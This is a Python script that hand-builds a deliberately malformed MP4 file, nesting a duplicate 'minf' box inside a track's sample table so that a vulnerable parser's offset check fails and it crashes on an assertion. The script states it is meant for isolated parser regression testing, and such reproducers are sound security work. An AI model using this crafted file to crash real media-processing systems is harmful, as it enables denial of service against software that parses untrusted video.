#!/usr/bin/env python3
"""Create the minimal nested duplicate-minf MP4 reproducer.

This hand-builds the exact layout where the duplicate ``minf`` is directly
below ``stbl`` *inside the first minf*:

  trak
    tkhd (92)
    mdia
      mdhd (32)
      hdlr (33)
      minf                    # outer/original minf
        stbl                  # valid sample table
          stsd (16, entry_count=0)
          stts (24)
          stsc (28)
          stsz (36)
          stco (20, chunk offset=0x200)
        minf (8, no children) # nested duplicate immediately after stbl

The physical offsets are:

  stbl_start  = 181
  prependsz   = stbl_start + stbl.headersz = 189
  stbl_end    = 313
  duplicate minf start = stbl_end = 313
  minf_offset = duplicate_minf_start - trak.headersz = 305

Therefore ``minf_offset > prependsz`` (305 > 189), and a vulnerable parser
that expects ``minf_offset < prependsz`` reaches its assertion failure.

The file is deliberately malformed and is intended only for isolated parser
regression testing.
"""

from __future__ import annotations

import argparse
import struct
from pathlib import Path


def box(kind: bytes, payload: bytes = b"") -> bytes:
    if len(kind) != 4:
        raise ValueError("box type must be four bytes")
    size = 8 + len(payload)
    if size >= 2**32:
        raise ValueError("box is too large")
    return struct.pack(">I4s", size, kind) + payload


def fullbox(version: int = 0, flags: int = 0) -> bytes:
    return struct.pack(">I", (version << 24) | flags)


def make_ftyp() -> bytes:
    # 8-byte header + 16-byte payload = 24 bytes.
    return box(b"ftyp", b"isom" + struct.pack(">I", 0x200) + b"isommp42")


def make_mvhd() -> bytes:
    # Version-0 mvhd: 100-byte payload, 108-byte box.
    payload = bytearray(100)
    payload[0:4] = fullbox()
    struct.pack_into(">I", payload, 12, 1)   # timescale
    struct.pack_into(">I", payload, 16, 10)  # duration
    return box(b"mvhd", bytes(payload))


def make_tkhd() -> bytes:
    # Version-0 tkhd: 84-byte payload, 92-byte box.
    payload = bytearray(84)
    payload[0:4] = fullbox(flags=0x000007)
    struct.pack_into(">I", payload, 12, 1)  # track_ID
    return box(b"tkhd", bytes(payload))


def make_mdhd() -> bytes:
    # 24-byte payload, 32-byte box.
    payload = bytearray(24)
    payload[0:4] = fullbox()
    struct.pack_into(">I", payload, 12, 1)   # timescale
    struct.pack_into(">I", payload, 16, 10)  # duration
    return box(b"mdhd", bytes(payload))


def make_hdlr() -> bytes:
    # 25-byte payload, 33-byte box; video handler.
    payload = fullbox() + struct.pack(">I4s12sB", 0, b"vide", bytes(12), 0)
    assert len(payload) == 25
    return box(b"hdlr", payload)


def make_stsd() -> bytes:
    return box(b"stsd", fullbox() + struct.pack(">I", 0))


def make_stts() -> bytes:
    # One entry: four samples with delta one.
    payload = fullbox() + struct.pack(">III", 1, 4, 1)
    assert len(payload) == 16
    return box(b"stts", payload)


def make_stsc() -> bytes:
    # One entry: first chunk 1, four samples/chunk, description 1.
    payload = fullbox() + struct.pack(">IIII", 1, 1, 4, 1)
    assert len(payload) == 20
    return box(b"stsc", payload)


def make_stsz() -> bytes:
    # Variable sizes: four samples of 16 bytes each.
    payload = fullbox() + struct.pack(">II", 0, 4) + struct.pack(">IIII", 16, 16, 16, 16)
    assert len(payload) == 28
    return box(b"stsz", payload)


def make_stco() -> bytes:
    # One chunk at absolute file offset 0x200.
    payload = fullbox() + struct.pack(">II", 1, 0x200)
    assert len(payload) == 12
    return box(b"stco", payload)


def make_fixture() -> bytes:
    stbl = box(
        b"stbl",
        make_stsd() + make_stts() + make_stsc() + make_stsz() + make_stco(),
    )
    duplicate_minf = box(b"minf")  # exactly 8 bytes, no children

    # Important: duplicate_minf is part of the FIRST minf payload, immediately
    # after stbl. It is not a sibling of the outer minf under mdia.
    outer_minf = box(b"minf", stbl + duplicate_minf)
    mdia = box(b"mdia", make_mdhd() + make_hdlr() + outer_minf)
    trak = box(b"trak", make_tkhd() + mdia)
    moov = box(b"moov", make_mvhd() + trak)
    output = make_ftyp() + moov + box(b"mdat")

    # Validate exact component sizes.
    assert len(make_ftyp()) == 24
    assert len(make_mvhd()) == 108
    assert len(make_tkhd()) == 92
    assert len(make_mdhd()) == 32
    assert len(make_hdlr()) == 33
    assert len(stbl) == 132
    assert len(duplicate_minf) == 8
    assert len(outer_minf) == 148
    assert len(mdia) == 221
    assert len(trak) == 321
    assert len(moov) == 437
    assert len(output) == 469

    # All values below are relative to the beginning of trak.
    trak_header_size = 8
    stbl_start = (
        trak_header_size
        + len(make_tkhd())
        + 8                 # mdia header
        + len(make_mdhd())
        + len(make_hdlr())
        + 8                 # outer minf header
    )
    prependsz = stbl_start + 8  # include stbl header
    stbl_end = stbl_start + len(stbl)
    duplicate_minf_start = stbl_end
    minf_offset = duplicate_minf_start - trak_header_size

    assert stbl_start == 181, f"stbl_start mismatch: {stbl_start}"
    assert prependsz == 189, f"prependsz mismatch: {prependsz}"
    assert stbl_end == 313, f"stbl_end mismatch: {stbl_end}"
    assert duplicate_minf_start == 313, f"duplicate minf start mismatch: {duplicate_minf_start}"
    assert minf_offset == 305, f"minf_offset mismatch: {minf_offset}"
    assert minf_offset > prependsz, (
        f"expected minf_offset > prependsz, got {minf_offset} <= {prependsz}"
    )

    print(
        f"stbl_start={stbl_start}, prependsz={prependsz}, "
        f"stbl_end={stbl_end}, duplicate_minf_start={duplicate_minf_start}, "
        f"minf_offset={minf_offset}"
    )
    print(f"Assertion trigger: {minf_offset} < {prependsz} is false")
    return output


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output",
        type=Path,
        default=Path(__file__).resolve().parent / "output" / "minimal_nested_duplicate_minf.mp4",
    )
    args = parser.parse_args()

    data = make_fixture()
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_bytes(data)
    print(f"Created {args.output} ({len(data)} bytes)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
